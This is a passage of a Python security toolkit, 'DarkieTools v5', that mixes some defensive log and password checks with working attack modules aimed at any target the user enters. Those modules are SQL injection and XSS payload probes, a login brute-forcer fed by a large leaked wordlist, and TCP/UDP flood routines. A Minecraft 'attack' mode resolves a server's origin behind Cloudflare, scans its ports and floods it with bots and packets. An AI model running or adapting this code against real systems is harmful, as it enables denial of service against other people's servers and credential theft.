    common = ["password", "123456", "qwerty", "letmein", "admin", "iloveyou", "12345678"]
    if pwd.lower() in common:
        score = 0
    rating = ["WEAK", "WEAK", "FAIR", "FAIR", "GOOD", "STRONG"]
    entropy = length * (len(set(pwd)) or 1).bit_length()
    color = RED if score < 2 else YELLOW if score < 4 else GREEN
    print(f"\n  {c('Length:', CYAN)} {length}  {c('Entropy:', CYAN)} ~{entropy} bits")
    for label, ok in [("Lowercase", has_lower), ("Uppercase", has_upper), ("Digits", has_digit), ("Symbols", has_sym)]:
        print(f"  {c(SYM_CHECK if ok else SYM_X, GREEN if ok else RED)} {label}")
    print(f"\n  {c('Rating:', CYAN)} {c(rating[score], color)} ({score}/5)\n")


def data_bruteforce_detect():
    header_box("Brute-Force Detection", YELLOW)
    system = platform.system().lower()
    if system != "linux":
        print(f"  {YELLOW}Brute-force detection currently targets Linux auth logs.{RESET}")
        return
    paths = ["/var/log/auth.log", "/var/log/secure"]
    fails = defaultdict(int)
    for lp in paths:
        if os.path.exists(lp):
            try:
                for line in open(lp):
                    m = re.search(r'Failed password for .* from (\S+)', line)
                    if m:
                        fails[m.group(1)] += 1
            except Exception:
                pass
    print(f"  {c('Failed login attempts by IP (last 10):', CYAN)}")
    for ip, n in sorted(fails.items(), key=lambda x: -x[1])[:10]:
        danger = n > 5
        print(f"  {c(ip, RED if danger else GREEN):22s} {c(str(n), CYAN)}")
        if danger:
            add_log_alert("HIGH", "BruteForce", f"{ip}: {n} failures")
    print()


def menu_data():
    _menu_loop("data", "Data & Access Protection", [
        ("1", "File Encryption / Decryption", data_encrypt),
        ("2", "Password Strength Analyzer", data_password_strength),
        ("3", "Brute-Force Detection", data_bruteforce_detect),
        ("b", "Back to main menu", None),
    ], YELLOW)


# ══════════════════════════════════════════════════════
#  MODULE 5: PENTEST (basic web checks)
# ══════════════════════════════════════════════════════

def _http_get(url, timeout=10):
    try:
        r = requests.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0 (DarkieTools v5)"}, verify=False)
        return r
    except Exception:
        return None


def pentest_sqli():
    header_box("SQL Injection Detector", GREEN)
    url = _get("Target URL (with ?param=)")
    if not url:
        return
    payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION SELECT NULL--"]
    print(f"  {c('Testing payloads...', CYAN)}")
    found = 0
    for payload in payloads:
        sep = "&" if "&" in url else "?"
        test_url = f"{url}{sep if url.count('=') else url + '?'}__sqli={payload.replace(' ', '%20')}"
        if "=" not in test_url:
            test_url = f"{url}{'&' if '&' in url else '?'}q={payload.replace(' ', '%20')}"
        r = _http_get(test_url, timeout=8)
        if r:
            body = (r.text or "").lower()
            indicators = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "ora-"]
            if any(ind in body for ind in indicators):
                print(f"  {RED}{SYM_WARN} Possible SQLi: {test_url[:80]}{RESET}")
                add_log_alert("HIGH", "SQLi", test_url[:100])
                found += 1
            else:
                print(f"  {GREEN}No indicator for: {payload[:24]}{RESET}")
        time.sleep(0.3)
    print(f"  {c(f'Done: {found} possible injection points', RED if found else GREEN)}\n")


def pentest_xss():
    header_box("XSS Scanner", GREEN)
    url = _get("Target URL (with ?param=)")
    if not url:
        return
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
                "\"><svg onload=alert(1)>", "{{7*7}}"]
    print(f"  {c('Testing payloads...', CYAN)}")
    found = 0
    for payload in payloads:
        test_url = f"{url}&__xss={payload.replace(' ', '%20')}" if "&" in url else f"{url}?q={payload.replace(' ', '%20')}"
        r = _http_get(test_url, timeout=8)
        if r and payload.lower() in (r.text or "").lower():
            print(f"  {RED}{SYM_WARN} Reflected XSS: {test_url[:80]}{RESET}")
            add_log_alert("HIGH", "XSS", test_url[:100])
            found += 1
        time.sleep(0.3)
    print(f"  {c(f'Done: {found} possible XSS points', RED if found else GREEN)}\n")


def pentest_http_methods():
    header_box("HTTP Methods Fuzzer", GREEN)
    url = _get("Target URL")
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH", "HEAD"]
    print(f"  {c('Testing methods...', CYAN)}")
    for m in methods:
        try:
            r = requests.request(m, url, timeout=8, headers={"User-Agent": "DarkieTools v5"}, verify=False)
            flag = "interesting" if r.status_code not in (404, 405, 501) else "blocked"
            print(f"  {c(f'{m:7s}', GREEN if flag == 'interesting' else YELLOW)} -> {r.status_code} ({flag})")
            if r.status_code not in (404, 405, 501):
                add_log_alert("WARN", "HTTPMethods", f"{m} {url}: {r.status_code}")
        except Exception as e:
            print(f"  {c(f'{m:7s}', RED)} -> error")
    print()


def pentest_login_bruteforce():
    header_box("Login Brute-Force Tester", GREEN)
    url = _get("Login URL")
    if not url:
        return
    user = _get("Username", "admin")
    field_u = _get("Username field name (POST key)", "username")
    field_p = _get("Password field name (POST key)", "password")
    fail_marker = _get("Failure keyword in response (e.g. incorrect)", "incorrect").lower()

    # Use the real 14M leaked wordlist if available, else fall back to built-ins.
    wl = None
    try:
        wl = _pick_wordlist()
    except Exception:
        wl = None
    if wl:
        print(f"  {c(f'Loading wordlist {os.path.basename(wl)} ...', CYAN)}")
        words = []
        try:
            with open(wl, "r", encoding="latin-1", errors="ignore") as f:
                # stream-pop so we don't hold 14M in memory forever
                for i, line in enumerate(f):
                    w = line.strip()
                    if w and len(words) < 2000000:
                        words.append(w)
                    if len(words) >= 2000000:
                        break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error reading wordlist: {e}{RESET}")
            words = []
    else:
        words = ["password", "123456", "admin", "admin123", "password123", "root", "letmein",
                 "welcome", "test", "changeme", "12345678", "qwerty", "kali", "darkie",
                 "1234krish", "krish1234", "toor", "123admin", "password1"]

    print(f"  {c(f'Testing {len(words)} passwords against {url}...', CYAN)}")
    print(f"  {c('Note: use only on accounts/systems you own.', YELLOW)}")
    found = False
    for i, pwd in enumerate(words, start=1):
        try:
            r = requests.post(url, data={field_u: user, field_p: pwd}, timeout=8,
                              headers={"User-Agent": "DarkieTools v5"}, verify=False)
            body = (r.text or "").lower()
            cracked = r.status_code == 200 and fail_marker and fail_marker not in body and len(body) > 100
            status = "HIT" if cracked else "x"
            print(f"  [{i}] {user}:{pwd} -> {r.status_code} {status if cracked else ''}".rstrip())
            if cracked:
                print(f"\n  {RED}{SYM_WARN} POSSIBLE CREDENTIAL: {c(f'{user}:{pwd}', RED)}{RESET}")
                print(f"  {YELLOW}Verify manually — this is a candidate, not confirmed.{RESET}")
                add_log_alert("HIGH", "Login", f"Candidate {user}:{pwd}")
                found = True
                break
        except Exception:
            pass
        if i % 200 == 0:
            print(f"  {DIM}{i}/{len(words)} tried...{RESET}")
        time.sleep(0.3)
    if not found:
        print(f"  {GREEN}{SYM_CHECK} No candidate found (fed {len(words)} passwords).{RESET}")
    print()


def menu_pentest():
    _menu_loop("pentest", "Ethical Hacking & Pentest", [
        ("1", "SQL Injection Detector", pentest_sqli),
        ("2", "XSS Scanner", pentest_xss),
        ("3", "HTTP Methods Fuzzer", pentest_http_methods),
        ("4", "Login Brute-Force Tester", pentest_login_bruteforce),
        ("b", "Back to main menu", None),
    ], GREEN)


# ══════════════════════════════════════════════════════
#  MODULE 6: SIEM & LOGS
# ══════════════════════════════════════════════════════

def siem_log_analyzer():
    header_box("Log File Analyzer", CYAN)
    path = _get("Log file path")
    if not path or not os.path.exists(path):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return
    print(f"  {c('Analyzing log file...', CYAN)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    counts = defaultdict(int)
    ips = defaultdict(int)
    errors = []
    try:
        with open(path, errors="ignore") as f:
            for line in f:
                ul = line.upper()
                for token in ["ERROR", "WARN", "INFO", "DEBUG", "FAILED", "DENIED", "TIMEOUT"]:
                    if token in ul:
                        counts[token] += 1
                for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line):
                    ips[ip] += 1
                if re.search(r'(ERROR|FAILED|CRITICAL)', ul):
                    errors.append(line.strip())
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
        return
    print(f"\n  {c('Event breakdown:', CYAN)}")
    for k, v in counts.items():
        color = RED if k in ("ERROR", "FAILED", "DENIED") else YELLOW if k == "WARN" else GREEN
        print(f"  {c(f'{k:8s}', color)} {c(f'{v:>6d}', CYAN)}")
    if ips:
        print(f"\n  {c('Top IPs:', CYAN)}")
        for ip, n in sorted(ips.items(), key=lambda x: -x[1])[:8]:
            print(f"    {c(ip, GREEN):18s} {c(n, CYAN)}")
    if errors:
        print(f"\n  {c('Sample errors:', RED)}")
        for e in errors[:5]:
            print(f"    {c(e[:110], RED)}")
    print()


def siem_alert_viewer():
    header_box("Alert Dashboard", CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts yet. Run other modules to generate alerts.{RESET}")
    for a in LOG_ALERTS[-30:]:
        color = RED if a["level"] in ("CRITICAL", "HIGH") else YELLOW if a["level"] == "WARN" else GREEN
        lvl = a["level"]
        print(f"  {c(a['timestamp'], CYAN)} {c(f'[{lvl:8s}]', color)} {c(a['source'][:18], MAGENTA)} {c(a['message'][:70], GREEN)}")
    print(f"  {c(f'Total: {len(LOG_ALERTS)} alerts', CYAN)}\n")


def siem_realtime():
    header_box("Real-time Log Monitor", CYAN)
    path = _get("Log file to tail")
    if not path or not os.path.exists(path):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return
    dur = _get_int("Monitor seconds", 30)
    print(f"  {c(f'Tailing for {dur}s... Ctrl+C to stop', CYAN)}")
    try:
        with open(path) as f:
            f.seek(0, 2)
            start = time.time()
            while time.time() - start < dur:
                line = f.readline()
                if line:
                    line = line.strip()
                    if re.search(r'(ERROR|CRITICAL|FAILED)', line, re.I):
                        print(f"  {RED}{line[:110]}{RESET}")
                        add_log_alert("HIGH", "LogMon", line[:100])
                    elif re.search(r'(WARN|DENIED)', line, re.I):
                        print(f"  {YELLOW}{line[:110]}{RESET}")
                    else:
                        print(f"  {c(line[:110], GREEN)}")
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    print()


def menu_siem():
    _menu_loop("siem", "SIEM & Log Analysis", [
        ("1", "Log File Analyzer", siem_log_analyzer),
        ("2", "Real-time Log Monitor", siem_realtime),
        ("3", "Alert Dashboard", siem_alert_viewer),
        ("b", "Back to main menu", None),
    ], CYAN)


# ══════════════════════════════════════════════════════
#  MODULE 7: STRESS TESTING
# ══════════════════════════════════════════════════════

STRESS_PORTS = [22, 80, 443, 8080, 8443, 3306, 5432, 25565, 19132, 9090]


def _tcp_worker(ip, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.sendall(b"GET / HTTP/1.0\r\n\r\n")
        s.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def _udp_worker(ip, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(128)
        for _ in range(3):
            s.sendto(payload, (ip, port))
        results[idx] = 1
    except Exception:
        results[idx] = 0


def stress_ip():
    header_box("IP Flood Test", RED)
    ip = _get("Target IP")
    if not ip:
        return
    try:
        socket.inet_aton(ip)
    except OSError:
        print(f"  {RED}{SYM_X} Invalid IP.{RESET}")
        return
    print(f"  {c('Mode:', CYAN)} [t]cp [u]dp [b]oth")
    mode = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip().lower() or "t"
    ports_in = _get("Ports (comma)", "80,443,8080")
    ports = [int(p) for p in ports_in.split(",") if p.strip()]
    nc = _get_int("Connections", 500)
    dur = _get_int("Duration (seconds)", 30)
    total = 0
    worker = _tcp_worker if mode in ("t", "b") else None
    udp = mode in ("u", "b")
    start = time.time()
    print(f"  {c(f'Flooding {ip}:{ports} ({mode.upper()}) for {dur}s... Ctrl+C to stop', RED)}")
    try:
        while time.time() - start < dur:
            br = {}
            with ThreadPoolExecutor(max_workers=min(nc, 1000)) as ex:
                fs = [ex.submit(worker, ip, ports[i % len(ports)], br, i) for i in range(nc)]
                for f in as_completed(fs):
                    try:
                        total += f.result()
                    except Exception:
                        pass
            sys.stdout.write(f"\r  {c(f'Sent: {total:,}', GREEN)} {c(f'{time.time()-start:.0f}s/{dur}s', YELLOW)}  ")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}Stopped by user.{RESET}")
    elapsed = time.time() - start
    rate = total / elapsed if elapsed else 0
    print(f"\n  {c(f'Total: {total:,} conns in {elapsed:.1f}s ({rate:,.0f}/s)', GREEN)}\n")


def stress_http():
    header_box("Web Stress Test", RED)
    url = _get("URL")
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    n = _get_int("Requests", 500)
    threads = _get_int("Concurrency", 50)
    ok = 0
    start = time.time()
    print(f"  {c(f'Sending {n} requests to {url} ({threads} concurrent)...', CYAN)}")
    sent = 0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        def w():
            nonlocal ok
            try:
                r = requests.get(url, timeout=8, headers={"User-Agent": "DarkieTools v5"}, verify=False)
                if r.status_code < 500:
                    ok += 1
            except Exception:
                pass
        fs = [ex.submit(w) for _ in range(n)]
        for f in as_completed(fs):
            sent += 1
            if sent % 100 == 0:
                sys.stdout.write(f"\r  {progress_bar(sent, n)}  OK:{ok}  ")
                sys.stdout.flush()
    elapsed = time.time() - start
    rate = sent / elapsed if elapsed else 0
    print(f"\n  {c(f'Done: {ok}/{sent} OK in {elapsed:.1f}s ({rate:.1f} req/s)', GREEN)}\n")


# ── Minecraft (Java/Bedrock) helpers ──────────────────────────

def _dns_parse_qname(buf, offset):
    """Parse a (possibly compressed) DNS name. Returns (name, next_offset)."""
    labels = []
    ret = offset
    cursor = offset
    jumps = 0
    while cursor < len(buf):
        length = buf[cursor]
        if length == 0:
            if not jumps:
                ret = cursor + 1
            break
        if length & 0xC0 == 0xC0:
            if cursor + 1 >= len(buf):
                break
            ptr = ((length & 0x3F) << 8) | buf[cursor + 1]
            if not jumps:
                ret = cursor + 2
            cursor = ptr
            jumps += 1
            if jumps > 20:
                break
            continue
        cursor += 1
        end = cursor + length
        if end > len(buf):
            break
        labels.append(buf[cursor:end].decode("ascii", "replace"))
        cursor = end
    return ".".join(labels), ret


def _dns_query(domain, qtype):
    """Raw DNS query (no dnspython needed). Returns rdata bytes for qtype."""
    if not domain:
        return []
    qtypes = {"A": 1, "NS": 2, "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33}
    qt = qtypes.get(qtype, qtype) if isinstance(qtype, str) else qtype
    trans_id = random.randint(0, 65535)
    header = struct.pack(">HHHHHH", trans_id, 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(x)]) + x.encode("ascii", "replace") for x in domain.split(".")) + b"\x00"
    packet = header + qname + struct.pack(">HH", qt, 1)

    resolvers = []
    try:
        with open("/etc/resolv.conf") as fh:
            for line in fh:
                parts = line.strip().split()
                if parts and parts[0] == "nameserver" and len(parts) >= 2 and ":" not in parts[1]:
                    resolvers.append(parts[1])
    except OSError:
        pass
    resolvers += ["8.8.8.8", "1.1.1.1"]

    for rsv in resolvers:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.sendto(packet, (rsv, 53))
            data, _ = s.recvfrom(4096)
            s.close()
            if len(data) < 12:
                continue
            rid, _flags = struct.unpack(">HH", data[:4])
            if rid != trans_id:
                continue
            ancount = struct.unpack(">H", data[6:8])[0]
            if ancount == 0:
                return []
            off = 12
            while off < len(data):
                length = data[off]
                if length == 0:
                    off += 1
                    break
                if length & 0xC0 == 0xC0:
                    off += 2
                    break
                off += 1 + length
            off += 4
            answers = []
            for _ in range(ancount):
                _name, off = _dns_parse_qname(data, off)
                if off + 10 > len(data):
                    break
                rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
                off += 10
                rdata = data[off:off + rdlen]
                off += rdlen
                if rtype == qt:
                    answers.append(rdata)
            return answers
        except Exception:
            continue
    return []


def _mc_varint(v):
    out = bytearray()
    while True:
        if v & 0xFFFFFF80 == 0:
            out.append(v & 0x7F)
            break
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    return bytes(out)


def _mc_pstr(s):
    d = s.encode("utf-8")
    return _mc_varint(len(d)) + d


def _mc_packet(pid, *parts):
    body = bytes([pid]) + b"".join(parts)
    return _mc_varint(len(body)) + body


def _mc_read_varint(sock):
    v = 0
    for i in range(5):
        b = sock.recv(1)
        if not b:
            return None
        v |= (b[0] & 0x7F) << (7 * i)
        if not (b[0] & 0x80):
            break
    return v


def _mc_build_handshake(ip, port):
    return _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))


def _mc_build_login(name=None):
    if name is None:
        name = f"Bot_{random.randint(10000, 99999)}_{random.choice(['X', 'Pro', 'YT', 'OP', 'HD'])}"
    return _mc_packet(0x00, _mc_pstr(name))


def _mc_bot_worker(host, port, results, idx):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(_mc_build_handshake(host, port))
        s.sendall(_mc_build_login())
        end = time.time() + 6
        while time.time() < end:
            try:
                s.settimeout(0.5)
                plen = _mc_read_varint(s)
                if plen is None:
                    break
                pid = _mc_read_varint(s)
                if pid is None:
                    break
                rest = plen - len(_mc_varint(pid))
                data = b""
                while len(data) < rest:
                    chunk = s.recv(rest - len(data))
                    if not chunk:
                        break
                    data += chunk
                if pid == 0x21:
                    s.sendall(_mc_packet(0x0F, data))
            except socket.timeout:
                continue
            except Exception:
                break
        results[idx] = 1
    except Exception:
        results[idx] = 0
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def mc_tcp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
    sent = 0
    errs = 0
    end = time.time() + duration
    hs = _mc_build_handshake(ip, port)
    try:
        while time.time() < end:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(3)
                s.connect((ip, port))
                s.sendall(hs)
                s.sendall(_mc_build_login())
                sent += 1
                results[idx] = (sent, errs)
            except Exception:
                errs += 1
                results[idx] = (sent, errs)
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
                continue
            if mode == "rapid":
                try:
                    s.close()
                except Exception:
                    pass
            else:
                end2 = min(time.time() + 2, end)
                while time.time() < end2:
                    try:
                        s.settimeout(0.5)
                        plen = _mc_read_varint(s)
                        if plen is None:
                            break
                        pid = _mc_read_varint(s)
                        if pid is None:
                            break
                        rest = plen - len(_mc_varint(pid))
                        data = b""
                        while len(data) < rest:
                            chunk = s.recv(rest - len(data))
                            if not chunk:
                                break
                            data += chunk
                        if pid == 0x21:
                            s.sendall(_mc_packet(0x0F, data))
                            sent += 1
                            results[idx] = (sent, errs)
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                try:
                    s.close()
                except Exception:
                    pass
        results[idx] = (sent, errs)
    except Exception:
        results[idx] = (sent, errs)


def mc_udp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
    sent = 0
    errs = 0
    end = time.time() + duration
    RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            try:
                timestamp = struct.pack(">Q", int(time.time() * 1000))
                payload = b"\x01" + timestamp + RAKNET_MAGIC + os.urandom(8)
                s.sendto(payload, (ip, port))
                sent += 1
                if sent % 100 == 0:
                    results[idx] = (sent, errs)
            except Exception:
                errs += 1
                results[idx] = (sent, errs)
        results[idx] = (sent, errs)
    except Exception:
        results[idx] = (sent, errs)


def _probe_online(ip, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False


def mc_srv_lookup(domain):
    """Java Edition SRV lookup: _minecraft._tcp.<domain> -> (host, port)."""
    srv_name = f"_minecraft._tcp.{domain}"
    if _which("dig"):
        try:
            r = _run(["dig", "+short", "SRV", srv_name], timeout=5)
            if r and r.stdout:
                for line in r.stdout.strip().splitlines():
                    parts = line.split()
                    if len(parts) >= 4:
                        try:
                            port = int(parts[2])
                        except ValueError:
                            continue
                        host = ".".join(parts[3:]).rstrip(".")
                        if host and host != ".":
                            return host, port
        except Exception:
            pass
    for rdata in _dns_query(srv_name, "SRV"):
        if len(rdata) < 7:
            continue
        _pri, _weight, port = struct.unpack(">HHH", rdata[:6])
        host, _ = _dns_parse_qname(rdata, 6)
        if host and host != ".":
            return host, port
    return None, None


def resolve_ip_candidates(domain):
    """Resolve a domain to all IPv4 addresses (dig preferred, getaddrinfo fallback)."""
    if _is_ip(domain):
        return [domain]
    ips = []
    if _which("dig"):
        try:
            r = _run(["dig", "+short", "A", domain], timeout=5)
            if r and r.stdout:
                for line in r.stdout.strip().splitlines():
                    ip = line.strip().rstrip(".")
                    try:
                        socket.inet_aton(ip)
                        if ip not in ips:
                            ips.append(ip)
                    except OSError:
                        pass
        except Exception:
            pass
    if not ips:
        try:
            for info in socket.getaddrinfo(domain, 0, socket.AF_INET):
                ip = info[4][0]
                if ip not in ips:
                    ips.append(ip)
        except Exception:
            pass
    return ips


def resolve_mc_target(target):
    """Find the real Minecraft server address from a domain (SRV-aware).
    Returns (ip, port, host_label) or (None, port, host_label) on failure."""
    host = target
    port = 25565
    if not _is_ip(target):
        srv_host, srv_port = mc_srv_lookup(target)
        if srv_host:
            host = srv_host
            port = srv_port
            print(f"  {c(SYM_CHECK + ' SRV record:', GREEN)} _minecraft._tcp.{target} {SYM_ARROW} {host}:{port}")
        else:
            print(f"  {c('No SRV record - using domain directly.', CYAN)}")
    ips = resolve_ip_candidates(host)
    if not ips:
        print(f"  {c(SYM_X + ' Could not resolve', RED)} {host}")
        return None, port, host
    for ip in ips:
        print(f"  {c('Resolved:', GREEN)} {host} {SYM_ARROW} {ip}")
    if _is_cloudflare(ips[0]):
        print(f"  {YELLOW}Cloudflare detected on resolved IP {ips[0]}.{RESET}")
    return ips[0], port, host


MC_PORT_RANGES = [
    25565, 25566, 25575, 25576, 25577, 25578,
    19132, 19133, 25564, 25567, 25568, 25569, 25570,
    25571, 25572, 25573, 25574, 25579, 25580,
    25585, 25590, 25595, 25600, 25650, 25700, 25750,
    25800, 25850, 25900, 25950, 26000, 26050, 26100,
    26150, 26200, 26250, 26300, 26350, 26400, 26450,
    26500, 26550, 26600, 26650, 26700, 26750, 26800,
    26850, 26900, 26950, 27000, 27015, 27050, 27100,
    20000, 20001, 20002, 20003, 20004, 20005,
    10000, 10001, 10002, 10003, 10004, 10005,
    30000, 30001, 30002, 30003, 30004, 30005,
]


def mc_find_ports(ip, verbose=True):
    open_ports = []

    if verbose:
        print(f"  {c('Probing common MC ports directly (for containerized/Pterodactyl servers)...', CYAN)}")

    def _probe(port, results, idx):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            r = s.connect_ex((ip, port))
            s.close()
            results[idx] = port if r == 0 else None
        except Exception:
            results[idx] = None

    batch_size = 100
    for batch_start in range(0, len(MC_PORT_RANGES), batch_size):
        batch = MC_PORT_RANGES[batch_start:batch_start + batch_size]
        br = {}
        with ThreadPoolExecutor(max_workers=100) as ex:
            fs = {ex.submit(_probe, p, br, i): i for i, p in enumerate(batch)}
            for f in as_completed(fs):
                try:
                    f.result()
                except Exception:
                    pass
        for i, p in enumerate(batch):
            if br.get(i) is not None:
                open_ports.append(p)

    open_ports.sort()
    if verbose and open_ports:
        if len(open_ports) <= 30:
            print(f"  {c('Open ports:', GREEN)} {c(str(open_ports), CYAN)}")
        else:
            print(f"  {c(f'Open ports ({len(open_ports)}):', GREEN)} {c(str(open_ports[:20]), CYAN)}{DIM}...{RESET}")
    elif verbose:
        print(f"  {c('No MC ports detected. Try entering the port manually.', YELLOW)}")
    return open_ports


def _ensure_mineflayer():
    tool_dir = os.path.dirname(os.path.abspath(__file__))
    nm_dir = os.path.join(tool_dir, "node_modules", "mineflayer")
    for candidate in (nm_dir,
                      os.path.join(os.path.dirname(tool_dir), "v2", "node_modules", "mineflayer"),
                      os.path.join(os.path.dirname(tool_dir), "v2.1", "node_modules", "mineflayer"),
                      os.path.join(os.path.dirname(tool_dir), "v2.2", "node_modules", "mineflayer")):
        if os.path.isdir(candidate):
            return
    print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Install with: cd v5 && npm install mineflayer{RESET}")
    try:
        subprocess.run(["npm", "install", "mineflayer"], cwd=tool_dir, capture_output=True, timeout=120)
        print(f"  {GREEN}{SYM_CHECK}  Mineflayer installed.{RESET}")
    except Exception:
        pass


def stress_minecraft():
    header_box("Minecraft Stress Test", RED)
    target = _get("Server IP or domain")
    if not target:
        return
    ip, srv_port, real_host = resolve_mc_target(target)
    if not ip:
        return

    if _is_cloudflare(ip):
        ans = input(f"  {YELLOW}Cloudflare detected! Enter real origin IP if known (or Enter to continue): {SYM_PROMPT} {RESET}").strip()
        if ans:
            ip = ans
            print(f"  {c(f'Using manual IP: {ip}', GREEN)}")
        else:
            print(f"  {c('Continuing with resolved IP (bypass may be needed).', YELLOW)}")

    print(f"  {c('Scanning for Minecraft ports...', CYAN)}")
    ports = mc_find_ports(ip)
    if ports:
        print(f"  {c('Found MC ports:', GREEN)} {c(str(ports), CYAN)}")
    else:
        print(f"  {c('No MC ports auto-detected (nmap may not see containerized servers).', YELLOW)}")

    p_in = input(f"  {c(f'Port (default {srv_port}) {SYM_PROMPT} ', CYAN)}").strip()
    port = int(p_in) if p_in.isdigit() else srv_port

    print(f"\n  {c('Attack type:', CYAN)}")
    print(f"  {c('[1]', GREEN)}  Bot attack (Node.js mineflayer bots)")
    print(f"  {c('[2]', GREEN)}  TCP flood")
    print(f"  {c('[3]', GREEN)}  UDP flood (Bedrock)")
    print(f"  {c('[4]', GREEN)}  Both (bots + flood)")
    at = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
    if at not in ("1", "2", "3", "4"):
        print(f"  {RED}Invalid choice.{RESET}")
        return

    bot_enabled = at in ("1", "4")
    flood_enabled = at in ("2", "3", "4")

    bc = 0
    bd = 0
    ft = "r"
    dur = 30
    cc = 500

    if bot_enabled:
        _ensure_mineflayer()
        b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', CYAN)}").strip()
        bc = int(b_in) if b_in.isdigit() else 20
        bd_in = input(f"  {c(f'Bot duration seconds (default 30) {SYM_PROMPT} ', CYAN)}").strip()
        bd = int(bd_in) if bd_in.isdigit() else 30

    if flood_enabled:
        print(f"\n  {c('Flood type:', CYAN)}")
        if at == "2":
            print(f"  {c('[r/1]', GREEN)}  Rapid fire (max CPS)")
            print(f"  {c('[s/2]', GREEN)}  Sustained (hold + keepalives)")
            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', CYAN)}").strip().lower() or "r"
            ft = {"r": "r", "1": "r", "s": "s", "2": "s"}.get(ft_raw, "r")
        elif at == "3":
            ft = "u"
            print(f"  {c('UDP flood (Bedrock protocol)', GREEN)}")
        else:
            print(f"  {c('[r/1]', GREEN)}  Rapid fire TCP (max CPS)")
            print(f"  {c('[s/2]', GREEN)}  Sustained TCP (hold + keepalive)")
            print(f"  {c('[u/3]', GREEN)}  UDP flood (Bedrock)")
            print(f"  {c('[b/4]', GREEN)}  Both TCP rapid + UDP")
            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', CYAN)}").strip().lower() or "r"
            ft = {"r": "r", "1": "r", "s": "s", "2": "s", "u": "u", "3": "u", "b": "b", "4": "b"}.get(ft_raw, "r")

        d_in = input(f"  {c(f'Duration seconds (default 30) {SYM_PROMPT} ', CYAN)}").strip()
        dur = int(d_in) if d_in.isdigit() else 30
        c_in = input(f"  {c(f'Concurrent connections (default 500) {SYM_PROMPT} ', CYAN)}").strip()
        cc = int(c_in) if c_in.isdigit() else 500

    if flood_enabled:
        print(f"\n  {c('Checking if host is online...', CYAN)}", end=" ")
        sys.stdout.flush()
        if _probe_online(ip, port):
            print(f"{GREEN}{SYM_CHECK} online{RESET}")
        else:
            print(f"{RED}{SYM_X} unreachable{RESET}")
            ans = input(f"  {YELLOW}Host not reachable on port {port}. Continue anyway? (y/N) {SYM_PROMPT} {RESET}").strip().lower()
            if ans != "y":
                print(f"  {c('Aborted.', RED)}")
                return

    bot_proc = None
    if bot_enabled:
        bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
        if os.path.exists(bot_script):
            print(f"  {c('Starting mineflayer bots...', CYAN)}")
            try:
                bot_proc = subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                def _bot_reader():
                    for line in iter(bot_proc.stdout.readline, ''):
                        if line:
                            sys.stdout.write(f"\r  {c('[Bot]', MAGENTA)} {line.strip()}{' ' * 40}\n")
                            sys.stdout.flush()
                t = threading.Thread(target=_bot_reader, daemon=True)
                t.start()
            except FileNotFoundError:
                print(f"  {RED}{SYM_X} Node.js not found. Install Node.js 18+ to use mineflayer bots.{RESET}")
                print(f"  {YELLOW}Falling back to raw TCP bots...{RESET}")
                bot_enabled = False
            except Exception as e:
                print(f"  {RED}{SYM_X} Failed to launch bots: {e}{RESET}")
                bot_enabled = False
        else:
